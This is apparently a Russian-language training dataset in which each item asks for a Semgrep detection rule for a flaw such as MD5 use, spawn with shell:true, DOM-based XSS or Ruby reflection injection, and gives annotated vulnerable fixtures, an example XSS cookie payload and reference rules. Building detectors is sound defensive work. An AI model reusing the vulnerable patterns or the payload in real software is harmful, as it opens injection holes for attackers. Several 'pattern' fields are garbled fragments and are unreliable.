    "instruction": "Создай Semgrep правило для: missing-cloudwatch-log-group-kms-key\nОписание уязвимости: The AWS CloudWatch Log group is missing a KMS key. While Log group data is always encrypted, you can optionally use a KMS key instead. Add `kms_key_id = \"yourKey\"` to your resource block.\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: missing-cloudwatch-log-group-kms-key.tf\n# ruleid: missing-cloudwatch-log-group-kms-key\nresource \"aws_cloudwatch_log_group\" \"fail\" {\n  retention_in_days = 1\n}\n\n# ok: missing-cloudwatch-log-group-kms-key\nresource \"aws_cloudwatch_log_group\" \"pass\" {\n  retention_in_days = 1\n  kms_key_id        = \"someKey\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_cloudwatch_log_group\" \"fail\" { \n  retention_in_days = 1\n}\n• resource \"aws_cloudwatch_log_group\" \"another_fail\" { \n  retention_in_days = 365\n}\n\nБезопасные паттерны:  \n• resource \"aws_cloudwatch_log_group\" \"pass\" { \n  retention_in_days = 1 \n  kms_key_id = \"someKey\"\n}\n• resource \"aws_cloudwatch_log_group\" \"ok\" { \n  retention_in_days = 7 \n  kms_key_id = \"anotherKey\"\n}\n\nЛегенда аннотаций:\n- // ruleid:missing-cloudwatch-log-group-kms-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-cloudwatch-log-group-kms-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: missing-cloudwatch-log-group-kms-key\n    patterns:\n      - patterns:\n          - pattern: resource \"aws_cloudwatch_log_group\" $ANYTHING {...}\n          - pattern-not-inside: |\n              resource \"aws_cloudwatch_log_group\" $ANYTHING {\n                ...\n                kms_key_id = ...\n                ...\n              }\n    message: >-\n      The AWS CloudWatch Log group is missing a KMS key. While Log group data is always encrypted, you can optionally use a KMS key instead. Add `kms_key_id = \"yourKey\"` to your resource block.\n    languages: [hcl]\n    severity: WARNING\n    metadata:\n      technology:\n        - aws\n        - terraform\n      category: best-practice\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска отсутствующего идентификатора ключа KMS в ресурсе AWS CloudWatch Log Group. Оно использует шаблон, который ищет ресурс 'aws_cloudwatch_log_group' с любым содержимым, за исключением блока, содержащего атрибут 'kms_key_id'. Это позволяет обнаружить случаи, когда ключ KMS не указан явно.\n\n# Ключевые элементы:\n- ID: missing-cloudwatch-log-group-kms-key\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-cloudwatch-log-group-kms-key",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения use-of-md5\nОписание уязвимости: Detected MD5 hash algorithm which is considered insecure. MD5 is not collision resistant and is therefore not suitable as a cryptographic signature. Use SHA256 or SHA3 instead.\nCWE: CWE-328: Use of Weak Hash\nТип анализа: search\nЯзык: kt",
    "input": "Требования:\n- Язык: kt\n- Тип анализа: search\n- CWE: CWE-328: Use of Weak Hash\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use-of-md5.kt\nimport java.security.MessageDigest\nimport org.apache.commons.codec.digest.DigestUtils\n\npublic class WeakHashes {\n  public fun sha1_digestutil(password: String): ByteArray {\n    // ok: use-of-md5\n      val sha256Digest: MessageDigest = MessageDigest.getInstance(\"SHA256\")\n      sha256Digest.update(password.getBytes())\n      val hashValue: ByteArray = sha256Digest.digest()\n      return hashValue\n    val hashValue: ByteArray = DigestUtils.getSha256Digest().digest(password.getBytes())\n    return hashValue\n  }\n\n  public fun md5(password: String): ByteArray {\n    // ruleid: use-of-md5\n    val md5Digest: MessageDigest = MessageDigest.getInstance(\"MD5\")\n    md5Digest.update(password.getBytes())\n    val hashValue: ByteArray = md5Digest.digest()\n    return hashValue\n  }\n\n  public fun md5_digestutil(password: String): ByteArray {\n    // ruleid: use-of-md5\n    val hashValue: ByteArray = DigestUtils.getMd5Digest().digest(password.getBytes())\n    return hashValue\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• val md5Digest: MessageDigest = MessageDigest.getInstance(\"MD5\")\n• val hashValue: ByteArray = DigestUtils.getMd5Digest().digest(password.getBytes())\n\nБезопасные паттерны:  \n• val sha256Digest: MessageDigest = MessageDigest.getInstance(\"SHA256\")\n• val hashValue: ByteArray = DigestUtils.getSha256Digest().digest(password.getBytes())\n\nЛегенда аннотаций:\n- // ruleid:use-of-md5: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-of-md5: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: use-of-md5\n  message: Detected MD5 hash algorithm which is considered insecure. MD5 is not collision resistant and\n    is therefore not suitable as a cryptographic signature. Use SHA256 or SHA3 instead.\n  languages:\n  - kt\n  severity: WARNING\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-328: Use of Weak Hash'\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#WEAK_MESSAGE_DIGEST_MD5\n    category: security\n    technology:\n    - kotlin\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  pattern-either:\n  - pattern: |\n      java.security.MessageDigest.getInstance(\"MD5\")\n  - pattern: |\n      org.apache.commons.codec.digest.DigestUtils.getMd5Digest()\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма хеширования MD5, который считается небезопасным из-за отсутствия устойчивости к коллизиям. Алгоритм MD5 не подходит для криптографических подписей и должен быть заменен более сильными алгоритмами, такими как SHA-256 или SHA-3. Правило использует шаблон 'pattern-either' для поиска двух возможных конструкций Java-кода, которые вызывают MD5: первая конструкция использует класс 'java.security.MessageDigest', а вторая — библиотеку Apache Commons Codec.\n\n# Ключевые элементы:\n- ID: use-of-md5\n- Язык: kt \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-of-md5",
      "language": "kt",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "spawn-shell-true\nОписание уязвимости: Found '$SPAWN' with '{shell: $SHELL}'. This is dangerous because this call will spawn the command using a shell process. Doing so propagates current shell settings and variables, which makes it much easier for a malicious actor to execute commands. Use '{shell: false}' instead.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: spawn-shell-true.js\nconst {exec, spawnSync} = require('child_process');\n\n// ruleid: spawn-shell-true\nconst ls = spawn('ls', ['-lh', '/usr'], {shell:true});\n\n// ruleid: spawn-shell-true\nconst pid = spawnSync('ls', ['-lh', '/usr'], {shell: '/bin/sh'});\n\n// ok: spawn-shell-true\nspawn('ls', ['-lh', '/usr'], {shell:false});\n\n// ok: spawn-shell-true\nspawn('ls', ['-lh', '/usr'], {});  # Ограничиваем длину\n\nОпасные паттерны:\n• const {exec, spawnSync} = require('child_process');\n// ruleid: spawn-shell-true\nconst ls = spawn('ls', ['-lh', '/usr'], {shell:true});\n• const {exec, spawnSync} = require('child_process');\n// ruleid: spawn-shell-true\nconst pid = spawnSync('ls', ['-lh', '/usr'], {shell: '/bin/sh'});\n\nБезопасные паттерны:  \n• const {exec, spawnSync} = require('child_process');\n// ok: spawn-shell-true\nspawn('ls', ['-lh', '/usr'], {shell:false});\n• const {exec, spawnSync} = require('child_process');\n// ok: spawn-shell-true\nspawn('ls', ['-lh', '/usr'], {});\n\nЛегенда аннотаций:\n- // ruleid:spawn-shell-true: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:spawn-shell-true: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: spawn-shell-true\n  message: >-\n    Found '$SPAWN' with '{shell: $SHELL}'. This is dangerous because this call will\n    spawn\n    the command using a shell process. Doing so propagates current shell settings\n    and variables, which\n    makes it much easier for a malicious actor to execute commands. Use '{shell: false}'\n    instead.\n  metadata:\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    category: security\n    technology:\n    - javascript\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  patterns:\n  - pattern-either:\n    - pattern: |\n        spawn(...,{shell: $SHELL})\n    - pattern: |\n        spawnSync(...,{shell: $SHELL})\n    - pattern: |\n        $CP.spawn(...,{shell: $SHELL})\n    - pattern: |\n        $CP.spawnSync(...,{shell: $SHELL})\n  - pattern-not: |\n      spawn(...,{shell: false})\n  - pattern-not: |\n      spawnSync(...,{shell: false})\n  - pattern-not: |\n      $CP.spawn(...,{shell: false})\n  - pattern-not: |\n      $CP.spawnSync(...,{shell: false})\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций spawn и spawnSync из модуля child_process в JavaScript, где параметр 'shell' установлен в значение переменной окружения ($SHELL). Это представляет угрозу безопасности, так как выполнение команд через оболочку может привести к выполнению команд с текущими настройками и переменными оболочки, что увеличивает риск выполнения несанкционированных команд. Правило также исключает случаи, когда 'shell' явно установлен в false или отсутствует.\n\n# Ключевые элементы:\n- ID: spawn-shell-true\n- Язык: javascript \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "spawn-shell-true",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения dom-based-xss\nОписание уязвимости: Detected possible DOM-based XSS. This occurs because a portion of the URL is being used to construct an element added directly to the page. For example, a malicious actor could send someone a link like this: http://www.some.site/page.html?default=<script>alert(document.cookie)</script> which would add the script to the page. Consider allowlisting appropriate values or using an approach which does not involve the URL.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: dom-based-xss.js\n// ruleid:dom-based-xss\ndocument.write(\"<OPTION value=1>\"+document.location.href.substring(document.location.href.indexOf(\"default=\")+8)+\"</OPTION>\");\n\n// ok:dom-based-xss\ndocument.write(\"<OPTION value=2>English</OPTION>\");  # Ограничиваем длину\n\nОпасные паттерны:\n• ruleid:dom-based-xss\\ndocument.write(\\\n• +document.location.href.substring(document.location.href.indexOf(\\\n• +8)\\\n\nБезопасные паттерны:  \n• ok:dom-based-xss\\ndocument.write(\\\n• )\n• ok:dom-based-xss\\ndocument.write(\\\n\nЛегенда аннотаций:\n- // ruleid:dom-based-xss: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dom-based-xss: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dom-based-xss\n  message: >-\n    Detected possible DOM-based XSS. This occurs because a portion of the URL is being used\n    to construct an element added directly to the page. For example, a malicious actor could\n    send someone a link like this: http://www.some.site/page.html?default=<script>alert(document.cookie)</script>\n    which would add the script to the page.\n    Consider allowlisting appropriate values or using an approach which does not involve the URL.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/www-community/attacks/DOM_Based_XSS\n    category: security\n    technology:\n    - browser\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  pattern-either:\n  - pattern: document.write(<... document.location.$W ...>)\n  - pattern: document.write(<... location.$W ...>)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных уязвимостей DOM-based XSS в JavaScript-коде. Оно использует шаблон document.write для проверки наличия переменных, содержащих части URL-адреса, которые могут быть использованы для создания элементов страницы. В опасных примерах демонстрируется запись значения из URL в элемент страницы через document.write, что может привести к выполнению вредоносного скрипта. Безопасные примеры показывают корректное использование document.write без включения потенциально опасных значений.\n\n# Ключевые элементы:\n- ID: dom-based-xss\n- Язык: javascript \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "dom-based-xss",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: check-unsafe-reflection-methods\nОписание уязвимости: Found user-controllable input to a reflection method. This may allow a user to alter program behavior and potentially execute arbitrary instructions in the context of the process. Do not provide arbitrary user input to `tap`, `method`, or `to_proc`\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: taint\nЯзык: ruby\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: taint\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: check-unsafe-reflection-methods.rb\nclass GroupsController < ApplicationController\n\n  def dynamic_method_invocations\n    # ruleid: check-unsafe-reflection-methods\n    params[:method].to_sym.to_proc.call(Kernel)\n    # ruleid: check-unsafe-reflection-methods\n    (params[:klass].to_s).method(params[:method]).(params[:argument])\n    # ruleid: check-unsafe-reflection-methods\n    Kernel.tap(&params[:method].to_sym)\n    User.method(\"#{User.first.some_method_thing}_stuff\")\n    user_input_value = params[:my_user_input]\n    # ruleid: check-unsafe-reflection-methods\n    anything.tap(&user_input_value.to_sym)\n    # ruleid: check-unsafe-reflection-methods\n    anything_else.tap { |thing| thing + user_input_value() }\n  end\n\n  def dynamic_method_invocations_ok\n    # ok: check-unsafe-reflection-methods\n    \"SomeClass\".to_sym.to_proc.call(Kernel)\n    # ok: check-unsafe-reflection-methods\n    SomeClass.method(\"some_method\").(\"some_argument\")\n    # ok: check-unsafe-reflection-methods\n    Kernel.tap(\"SomeClass\".to_sym)\n    user_input_value = params[:my_user_input]\n    # ok: check-unsafe-reflection-methods\n    user_input_value.tap(\"some_method\")\n  end\n\nend  # Ограничиваем длину\n\nОпасные паттерны:\n• params[:method].to_sym.to_proc.call(Kernel)\n• (params[:klass].to_s).method(params[:method]).(params[:argument])\n• Kernel.tap(&params[:method].to_sym)\n\nБезопасные паттерны:  \n• 'SomeClass'.to_sym.to_proc.call(Kernel)\n• SomeClass.method('some_method').('some_argument')\n• Kernel.tap('SomeClass'.to_sym)\n\nЛегенда аннотаций:\n- // ruleid:check-unsafe-reflection-methods: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:check-unsafe-reflection-methods: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: check-unsafe-reflection-methods\n  mode: taint\n  pattern-sources:\n  - pattern-either:\n    - pattern: |\n        cookies[...]\n    - patterns:\n      - pattern: |\n          cookies. ... .$PROPERTY[...]\n      - metavariable-regex:\n          metavariable: $PROPERTY\n          regex: (?!signed|encrypted)\n    - pattern: |\n        params[...]\n    - pattern: |\n        request.env[...]\n  pattern-sinks:\n  - patterns:\n    - pattern: $X\n    - pattern-either:\n      - pattern-inside: |\n          $X. ... .to_proc\n      - patterns:\n          - pattern-inside: |\n              $Y.method($Z)\n          - focus-metavariable: $Z\n      - patterns:\n          - pattern-inside: |\n              $Y.tap($Z)\n          - focus-metavariable: $Z\n      - patterns:\n          - pattern-inside: |\n              $Y.tap{ |$ANY| $Z }\n          - focus-metavariable: $Z\n  message: Found user-controllable input to a reflection method. This may allow a user to alter program\n    behavior and potentially execute arbitrary instructions in the context of the process. Do not provide\n    arbitrary user input to `tap`, `method`, or `to_proc`\n  languages:\n  - ruby\n  severity: ERROR\n  metadata:\n    source-rule-url: https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_unsafe_reflection_methods.rb\n    category: security\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    technology:\n    - ruby\n    - rails\n    references:\n    - https://github.com/presidentbeef/brakeman/blob/main/test/apps/rails6/app/controllers/groups_controller.rb\n    cwe2022-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования методов отражения (`to_proc`, `method` или `tap`) с потенциально контролируемым пользователем вводом. Источники ввода определяются как параметры запроса (`params`), куки (`cookies`) и переменные окружения (`request.env`). Синки (слабые места) включают вызовы этих методов с метапеременными ($X), внутри которых могут находиться выражения, содержащие пользовательский ввод. Правило использует комбинацию операторов AND и OR для определения источников и синков, а также фокусируется на конкретных выражениях, связанных с методами отражения.\n\n# Ключевые элементы:\n- ID: check-unsafe-reflection-methods\n- Язык: ruby \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "check-unsafe-reflection-methods",
      "language": "ruby",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения storage-queue-services-logging\nОписание уязвимости: Storage Analytics logs detailed information about successful and failed requests to a storage service. This information can be used to monitor individual requests and to diagnose issues with a storage service. Requests are logged on a best-effort basis.\nCWE: CWE-778: Insufficient Logging\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-778: Insufficient Logging\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: storage-queue-services-logging.tf\nresource \"azurerm_storage_account\" \"good_example\" {\n    name                     = \"example\"\n    resource_group_name      = data.azurerm_resource_group.example.name\n    location                 = data.azurerm_resource_group.example.location\n    account_tier             = \"Standard\"\n    account_replication_type = \"GRS\"\n    queue_properties  {\n    logging {\n        delete                = true\n        read                  = true\n        write                 = true\n        version               = \"1.0\"\n        retention_policy_days = 10\n    }\n  }\n}\n\n# ruleid: storage-queue-services-logging\nresource \"azurerm_storage_account\" \"bad_example\" {\n    name                     = \"example\"\n    resource_group_name      = data.azurerm_resource_group.example.name\n    location                 = data.azurerm_resource_group.example.location\n    account_tier             = \"Standard\"\n    account_replication_type = \"GRS\"\n    queue_properties  {\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_storage_account\" \"bad_example\" { ... }\n• resource \"azurerm_storage_account\" \"another_bad_example\" { ... queue_properties { ... } }\n• resource \"azurerm_storage_account\" \"yet_another_bad_example\" { ... queue_properties { ... logging {} } ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_storage_account\" \"good_example\" { ... queue_properties { logging { delete = true read = true write = true version = \"1.0\" retention_policy_days = 10 } } ... }\n• resource \"azurerm_storage_account\" \"safe_example_2\" { ... queue_properties { logging { delete = false read = false write = false version = \"1.0\" retention_policy_days = 0 } } ... }\n• resource \"azurerm_storage_account\" \"safe_example_3\" { ... queue_properties { logging { delete = true read = true write = true version = \"1.0\" retention_policy_days = 0 } } ... }\n\nЛегенда аннотаций:\n- // ruleid:storage-queue-services-logging: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:storage-queue-services-logging: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: storage-queue-services-logging\n  message: >-\n    Storage Analytics logs detailed information about successful and failed requests to a storage service.\n    This information can be used to monitor individual requests and to diagnose issues with a storage\n    service.\n    Requests are logged on a best-effort basis.\n  patterns:\n  - pattern-either:\n    - pattern-inside: |\n        resource \"azurerm_storage_account\" \"...\" {\n          ...\n              queue_properties  {\n                ...\n              }\n          ...\n        }\n    - pattern-inside: |\n        resource \"azurerm_storage_account\" \"...\" {\n          ...\n        }\n  - pattern-not-inside: |\n      resource \"azurerm_storage_account\" \"...\" {\n        ...\n              queue_properties  {\n                ...\n                logging {\n                  ...\n                }\n                ...\n              }\n        ...\n      }\n  metadata:\n    cwe:\n    - 'CWE-778: Insufficient Logging'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#logging\n    - https://docs.microsoft.com/en-us/azure/storage/common/storage-analytics-logging?tabs=dotnet\n    owasp:\n    - A10:2017 - Insufficient Logging & Monitoring\n    - A09:2021 - Security Logging and Monitoring Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure Storage Account в Terraform конфигурациях, где отсутствует секция logging в блоке queue_properties. Правило использует шаблон, который ищет ресурсы типа azurerm_storage_account внутри блока queue_properties, но исключает случаи, когда logging явно указан с параметрами delete, read, write и retention_policy_days. Это позволяет обнаружить конфигурации, которые не включают детальную регистрацию запросов к хранилищу, что может привести к недостаточной регистрации событий и затруднить мониторинг и диагностику проблем.\n\n# Ключевые элементы:\n- ID: storage-queue-services-logging\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "storage-queue-services-logging",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: avoid-raw\nОписание уязвимости: 'raw' renders raw HTML, as the name implies. This means that normal HTML escaping is bypassed. If user data can be controlled here, this exposes your application to cross-site scripting (XSS). If you need to do this, be sure to correctly sanitize the data using a library such as DOMPurify.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: avoid-raw.erb\n@custom_page_title = “Page <strong>Title</strong>”\n<div>\n  <!-- ruleid: avoid-raw -->\n  <h1><%= raw @custom_page_title %></h1>\n  <!-- ok: avoid-raw -->\n  <h1><%= @custom_page_title %></h1>\n</div>  # Ограничиваем длину\n\nОпасные паттерны:\n• <%=@custom_page_title=%>\n• <%= raw @custom_page_title %>\n• <%= raw params[:input] %>\n\nБезопасные паттерны:  \n• <%= @custom_page_title %>\n• <%= h(@custom_page_title) %>\n\nЛегенда аннотаций:\n- // ruleid:avoid-raw: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-raw: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-raw\n  message: >-\n    'raw' renders raw HTML, as the name implies. This means that normal\n    HTML escaping is bypassed. If user data can be controlled here, this\n    exposes your application to cross-site scripting (XSS). If you need to\n    do this, be sure to correctly sanitize the data using a library such as\n    DOMPurify.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    source-rule-url: https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_cross_site_scripting.rb\n    references:\n    - https://stackoverflow.com/questions/4251284/raw-vs-html-safe-vs-h-to-unescape-html#:~:text===\n    - https://medium.com/sumone-technical-blog/a-pretty-way-to-unescape-html-in-a-ruby-on-rails-application-efc22b850027\n    category: security\n    technology:\n    - rails\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages: [generic]\n  paths:\n    include:\n    - '*.erb'\n  severity: WARNING\n  patterns:\n  - pattern-inside: <%= ... %>\n  - pattern: raw\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода 'raw' внутри шаблонов erb-файлов. Метод 'raw' рендерит HTML-код без обычной эскейпинг-обработки, что позволяет обойти стандартную защиту от XSS-уязвимостей. Правило ищет конструкции вида '<%= raw ... %>' внутри тегов erb-шаблона.\n\n# Ключевые элементы:\n- ID: avoid-raw\n- Язык: generic \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid-raw",
      "language": "generic",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения gcp-org-impersonation-roles-iam-member\nОписание уязвимости: Ensure no roles that enable to impersonate and manage all service accounts are used at an organization level\t\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-org-impersonation-roles-iam-member.tf\n# fail\n# ruleid: gcp-org-impersonation-roles-iam-member\nresource \"google_organization_iam_member\" \"fail\" {\n    org_id  = \"your-organization-id\"\n    role    = \"roles/editor\"\n    member  = \"serviceAccount:test-compute@developer.gserviceaccount.com\"\n}\n\n# ok: gcp-org-impersonation-roles-iam-member\nresource \"google_organization_iam_member\" \"success\" {\n    org_id  = \"your-organization-id\"\n    role    = \"roles/other\"\n    member  = \"user:jane@example.com\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \\\n•  \\\n•  { \\n    org_id  = \\\n\nБезопасные паттерны:  \n• resource \\\n•  \\\n•  { \\n    org_id  = \\\n\nЛегенда аннотаций:\n- // ruleid:gcp-org-impersonation-roles-iam-member: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-org-impersonation-roles-iam-member: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-org-impersonation-roles-iam-member\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"google_organization_iam_member\" \"...\" {\n      ...\n      role = \"roles/editor\"\n      member = ...\n      ...\n      }\n  message: >-\n    Ensure no roles that enable to impersonate and manage all service accounts are used at an organization\n    level\t\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования ролей Google Cloud Platform (GCP), которые позволяют импersonate и управлять всеми сервисными аккаунтами на организационном уровне. Анализ выполняется путем поиска ресурса типа google_organization_iam_member с заданным значением роли 'roles/editor'. Если такое значение найдено, то это считается опасным примером, так как роль 'roles/editor' предоставляет слишком широкие полномочия и может привести к нарушениям контроля доступа.\n\n# Ключевые элементы:\n- ID: gcp-org-impersonation-roles-iam-member\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-org-impersonation-roles-iam-member",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: python-debugger-found\nОписание уязвимости: Importing the python debugger; did you mean to leave this in?\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: pdb.py\n# ruleid: python-debugger-found\nimport pdb\n\n# ruleid: python-debugger-found\npdb.set_trace()\n\n\ndef foo():\n    # ok: python-debugger-found\n    p = not_pdb.set_trace()  # Ограничиваем длину\n\nОпасные паттерны:\n• import pdb\npdb.set_trace()\n• from pdb import set_trace\nset_trace()\n\nБезопасные паттерны:  \n• import os\nos.system('python -m pdb myscript.py')\n• import traceback\ntraceback.print_exc()\n\nЛегенда аннотаций:\n- // ruleid:python-debugger-found: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:python-debugger-found: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: python-debugger-found\n    pattern-either:\n      - pattern: import pdb\n      - pattern: pdb.set_trace()\n    message: Importing the python debugger; did you mean to leave this in?\n    severity: WARNING\n    languages:\n      - python\n    metadata:\n      category: best-practice\n      technology:\n        - python\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска импортирования модуля pdb или вызова функции set_trace(), которые могут указывать на оставленный отладчик в продакшен-коде. Анализ выполняется методом поиска (search) в Python-коде. Правило использует конструкцию pattern-either для обнаружения либо импорта модуля 'pdb', либо вызова функции 'set_trace()'. В опасных примерах показаны случаи прямого использования этих конструкций, тогда как безопасные примеры демонстрируют альтернативные способы достижения той же цели без использования pdb.\n\n# Ключевые элементы:\n- ID: python-debugger-found\n- Язык: python \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "python-debugger-found",
